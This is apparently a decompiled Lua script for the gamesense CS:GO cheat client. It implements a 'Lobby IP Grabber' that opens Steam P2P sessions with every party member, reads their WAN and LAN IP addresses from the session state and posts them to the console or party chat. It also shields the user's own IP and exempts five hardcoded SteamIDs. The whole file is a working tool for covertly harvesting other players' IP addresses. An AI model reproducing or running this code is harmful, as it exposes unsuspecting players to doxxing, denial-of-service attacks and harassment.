local var_0_0 = require("gamesense/steamworks")
local var_0_1 = var_0_0.ISteamNetworking
local var_0_2 = panorama.open()
local var_0_3 = var_0_2["$"]
local var_0_4 = var_0_2.MyPersonaAPI
local var_0_5 = var_0_2.PartyListAPI
local var_0_6 = var_0_2.GameStateAPI
local var_0_7 = var_0_2.LobbyAPI
local var_0_8 = var_0_0.EP2PSessionError
local var_0_9 = var_0_0.EP2PSend
local var_0_10 = {}
local var_0_11 = {}
local var_0_12 = {}
local var_0_13
local var_0_14
local var_0_15
local var_0_16
local var_0_17 = ui.new_checkbox("MISC", "Miscellaneous", "Lobby IP Grabber")
local var_0_18 = ui.new_combobox("MISC", "Miscellaneous", "Output", {
	"Party Chat",
	"Console"
})

ui.set(var_0_18, "Console")

local var_0_19 = ui.new_checkbox("MISC", "Miscellaneous", "Mask IPs")
local var_0_20 = ui.new_button("MISC", "Miscellaneous", "Grab", function()
	var_0_13()
end)

ui.set_visible(var_0_18, false)
ui.set_visible(var_0_19, false)
ui.set_visible(var_0_20, false)
ui.set_callback(var_0_17, function(arg_2_0)
	local var_2_0 = ui.get(arg_2_0)

	ui.set_visible(var_0_18, var_2_0)
	ui.set_visible(var_0_19, var_2_0)
	ui.set_visible(var_0_20, var_2_0)
end)

local function var_0_21(...)
	local var_3_0 = ui.get(var_0_18)
	local var_3_1 = table.pack(...)
	local var_3_2 = table.concat(var_3_1, " ")

	if var_3_0 == "Console" then
		print(var_3_2)
	elseif var_3_0 == "Party Chat" then
		var_0_14(var_3_2)
	end
end

var_0_0.set_callback("P2PSessionRequest_t", function(arg_4_0)
	local var_4_0, var_4_1 = var_0_1.GetP2PSessionState(arg_4_0.m_steamIDRemote)
	local var_4_2 = tostring(arg_4_0.m_steamIDRemote)

	if not var_0_7.IsPartyMember(var_4_2) then
		return
	end

	local var_4_3 = var_0_5.GetFriendName(var_4_2)

	print("[POTENTIAL GRABBER] ", var_4_3, " (", arg_4_0.m_steamIDRemote, ") might be trying to steal your ip!")

	local var_4_4 = 10
	local var_4_5 = 10

	for iter_4_0 = 1, var_4_4 do
		client.delay_call(var_4_4 == 1 and 0 or (iter_4_0 - 1) * var_4_5 / 1000, function()
			var_0_3.DispatchEvent("PlaySoundEffect", "container_weapon_ticker", "MOUSE")
		end)
	end
end)

function var_0_13()
	var_0_10 = {}
	var_0_11 = {}
	var_0_12 = {}
	var_0_16 = true

	for iter_6_0 = 0, var_0_5.GetCount() - 1 do
		local var_6_0 = var_0_5.GetXuidByIndex(iter_6_0)

		if var_6_0:len() > 7 and var_6_0 ~= var_0_4.GetXuid() then
			local var_6_1 = var_0_0.SteamID(var_6_0)

			var_0_10[#var_0_10 + 1] = var_6_1
			var_0_11[var_6_1] = var_0_5.GetFriendName(var_6_0)

			var_0_1.SendP2PPacket(var_6_1, "asdf", 4, var_0_9.UnreliableNoDelay, 0)
		end
	end

	var_0_21("[[ IP GRABBER ]]")
	var_0_21("# Added " .. #var_0_10 .. " to queue!")
	var_0_21("# Waiting 5 secs...")
	client.delay_call(5, function()
		var_0_16 = false

		local var_7_0 = ui.get(var_0_18)
		local var_7_1 = (var_7_0 == "Party Chat" and "𝗪𝗔𝗡" or "WAN") .. ": "
		local var_7_2 = (var_7_0 == "Party Chat" and "𝗟𝗔𝗡" or "LAN") .. ": "

		for iter_7_0, iter_7_1 in pairs(var_0_12) do
			local var_7_3 = ""

			for iter_7_2, iter_7_3 in ipairs(iter_7_1) do
				local var_7_4 = #iter_7_1 == 1 and var_7_1 or iter_7_2 == 1 and var_7_2 or var_7_1

				var_7_3 = var_7_3 .. var_7_4 .. var_0_15(iter_7_3, ui.get(var_0_19)) .. (#iter_7_1 == 1 and "" or iter_7_2 == 1 and " | " or "")
			end

			local var_7_5, var_7_6 = renderer.measure_text(nil, var_0_11[iter_7_0])

			var_0_21(string.sub(var_0_11[iter_7_0], 1, 25) .. ":", var_7_3)
		end
	end)
end

local var_0_22 = {
	["76561198861797912"] = true,
	["76561198148192561"] = true,
	["76561198108791626"] = true,
	["76561198237598500"] = true,
	["76561198089758951"] = true
}

local function var_0_23()
	for iter_8_0, iter_8_1 in ipairs(var_0_10) do
		local var_8_0, var_8_1 = var_0_1.GetP2PSessionState(iter_8_1)

		if var_8_1.m_nRemoteIP ~= 0 then
			var_0_12[iter_8_1] = var_0_12[iter_8_1] or {}

			local var_8_2 = false

			for iter_8_2, iter_8_3 in ipairs(var_0_12[iter_8_1]) do
				if iter_8_3 == var_8_1.m_nRemoteIP then
					var_8_2 = true
				end
			end

			if not var_8_2 and not var_0_22[tostring(iter_8_1)] then
				table.insert(var_0_12[iter_8_1], var_8_1.m_nRemoteIP)
			end
		end
	end

	client.delay_call(0.25, var_0_23)
end

var_0_23()

local function var_0_24()
	if var_0_7.IsSessionActive() and not var_0_16 then
		for iter_9_0 = 0, var_0_5.GetCount() - 1 do
			local var_9_0 = var_0_5.GetXuidByIndex(iter_9_0)

			if var_9_0:len() > 7 and var_9_0 ~= var_0_4.GetXuid() then
				local var_9_1 = var_0_0.SteamID(var_9_0)

				var_0_1.CloseP2PSessionWithUser(var_9_1)
			end
		end
	end

	client.delay_call(0.01, var_0_24)
end

var_0_24()

function var_0_14(arg_10_0)
	var_0_5.SessionCommand("Game::Chat", string.format("run all xuid %s chat %s", var_0_4.GetXuid(), arg_10_0:gsub(" ", " ")))
end

function var_0_15(arg_11_0, arg_11_1)
	arg_11_0 = tonumber(arg_11_0)

	local var_11_0 = math.floor(arg_11_0 / 16777216)
	local var_11_1 = math.floor((arg_11_0 - var_11_0 * 16777216) / 65536)
	local var_11_2 = math.floor((arg_11_0 - var_11_0 * 16777216 - var_11_1 * 65536) / 256)
	local var_11_3 = math.floor(arg_11_0 - var_11_0 * 16777216 - var_11_1 * 65536 - var_11_2 * 256)

	if arg_11_1 then
		return var_11_0 .. "." .. var_11_1 .. ".xxx.xxx"
	end

	return var_11_0 .. "." .. var_11_1 .. "." .. var_11_2 .. "." .. var_11_3
end
